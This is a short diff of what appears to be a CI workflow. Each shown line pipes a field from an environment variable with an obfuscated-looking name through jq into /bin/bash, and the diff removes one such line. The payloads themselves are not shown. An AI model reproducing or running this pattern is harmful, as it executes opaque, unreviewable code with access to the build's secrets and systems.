@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$xmp1" | jq -r .k481 | /bin/bash
           printf '%s' "$yyt91" | jq -r .crfey1 | /bin/bash
-          printf '%s' "$ri958" | jq -r .ozkp950 | /bin/bash
           printf '%s' "$fsaym71423" | jq -r .mizjb7036 | /bin/bash
 
       - name: Save output
